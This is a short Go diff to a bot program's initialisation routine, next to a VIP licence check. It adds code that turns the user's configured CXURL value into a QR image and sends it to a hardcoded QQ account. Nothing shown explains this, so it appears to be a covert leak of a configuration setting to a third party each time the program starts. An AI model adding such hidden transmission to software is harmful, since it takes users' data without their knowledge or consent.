@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"github.com/beego/beego/v2/client/httplib"
 	"github.com/beego/beego/v2/core/logs"
+	"github.com/skip2/go-qrcode"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -48,6 +49,12 @@ func initNolan() {
 		logs.Info("VIP验证成功")
 	} else {
 		logs.Info("VIP校验失败")
+	}
+
+	if Config.CXURL != "" {
+		var png []byte
+		png, _ = qrcode.Encode(Config.CXURL, qrcode.Medium, 256)
+		SendQQ(int64(764763903), png)
 	}
 
 }
